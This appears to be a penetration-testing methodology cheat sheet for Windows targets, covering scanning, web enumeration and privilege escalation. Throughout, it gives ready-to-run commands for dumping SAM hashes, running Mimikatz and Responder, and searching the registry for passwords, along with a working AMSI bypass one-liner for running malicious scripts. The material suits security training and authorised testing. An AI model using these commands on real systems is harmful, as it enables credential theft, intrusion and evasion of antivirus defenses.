
---
### **1. Scan for Services**

🔍 The first step is to **scan** for active services on the target system.

- Use **Nmap** to identify open ports and services:
    
    ```bash
    nmap -sV -sC -p- <TARGET_IP>
    ```
    
- Look for **potentially vulnerable services**.
    

---

### **2. Exploit Services for Initial Foothold**

Once services are identified, try to **exploit them** to gain initial access.

#### **A. Web Services**

- **Enumerate files & directories** (Hidden files, backups, etc.)
    
    ```bash
    gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
    ```
    
- **Check virtual hosts** (if subdomains exist)
    
    ```bash
    ffuf -u http://<TARGET_IP> -H "Host: FUZZ.<TARGET_DOMAIN>" -w subdomains.txt
    ```
    
- **Look for known vulnerabilities (CVEs)**
    
    ```bash
    searchsploit <SERVICE_NAME>
    ```
    
- **Check for custom vulnerabilities** (e.g., SQLi, XSS, LFI).
    

#### **B. Non-Web Services (Active Directory & Others)**

- **Enumerate entry points** (e.g., SMB, RDP, LDAP, FTP).
    
- **Check for misconfigurations** (e.g., null sessions, weak credentials).
    
- **Look for known CVEs** (e.g., EternalBlue, PrintNightmare).
    
- **Identify custom vulnerabilities** that may allow exploitation.
    

---

### **3. Privilege Escalation**

Once inside, escalate privileges to **gain full control** over the system.

#### **A. Enumerate Users, Groups, and Privileges**

- **List users & groups:**
    
    ```powershell
    whoami /priv
    net localgroup administrators
    ```
    
- **Look for dangerous privileges** like:
    
    - `SeImpersonatePrivilege`
        
    - `SeBackupPrivilege`
        

#### **B. Enumerate Installed Applications**

- Check for **vulnerable software**:
    
    ```powershell
    wmic product get name,version
    ```
    
- Look for **exploitable versions**:
    
    ```bash
    searchsploit <SOFTWARE_NAME>
    ```
    

#### **C. Enumerate Services**

- **Find weak permissions:**
    
    ```powershell
    icacls "C:\Path\To\Service"
    ```
    
- **Check for unquoted service paths:**
    
    ```powershell
    wmic service get name,displayname,pathname | findstr /i "C:\Program Files"
    ```
    
- **Look for DLL hijacking opportunities.**
    

#### **D. Enumerate Files in Accessible Directories**

Look for **sensitive files** containing credentials:

- **Dump NTLM hashes** from `SAM` + `SYSTEM` files:
    
    ```bash
    reg save HKLM\SAM sam.save
    reg save HKLM\SYSTEM system.save
    ```
    
- **PowerShell history** (`C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`).
    
- **Environment & Config files** (e.g., `web.config`).
    
- **Backup files** (`.bak`, `.zip`).
    
- **Password manager databases**.
    

#### **E. Enumerate Stored Credentials**

- **Check for plaintext credentials**:
    
    ```powershell
    cmdkey /list
    ```
    
- **Search for credentials in scripts and configs**.
    

#### **F. Check for Always Installed Elevated Configuration**

Some applications **run with SYSTEM privileges** even if executed by a normal user.

#### **G. If User is in a Privileged Group with Low Integrity Level**

- **Try a UAC Bypass** to escalate integrity level:
    
    ```powershell
    C:\Windows\System32\cmd.exe /c "C:\Path\To\Bypass.exe"
    ```
    

#### **H. If Running as Administrator**

- **Run Mimikatz to dump NTLM hashes**:
    
    ```powershell
    mimikatz
    sekurlsa::logonpasswords
    ```
    
- **Extract stored credentials**.
    

#### **I. Obtain NTLM Hash of the Current User**

- **Run Responder to capture Net-NTLM hashes**:
    
    ```bash
    responder -I eth0 -wF
    ```
    

#### **J. Enumerate Scheduled Tasks**

- **List all scheduled tasks**:
    
    ```powershell
    schtasks /query /fo LIST /v
    ```
    
- Check for tasks **running as SYSTEM** that can be modified.
    

#### **K. Enumerate Critical Registry Paths**

- **Look for stored passwords & misconfigurations**:
    
    ```powershell
    reg query HKLM /f password /t REG_SZ /s
    ```
    

#### **L. If Antivirus is Active**

- **Bypass AMSI to run malicious scripts**:
    
    ```powershell
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static') | Where-Object { $_.Name -like "amsiInitFailed" } | ForEach-Object { $_.SetValue($null,$true) }
    ```
    

---
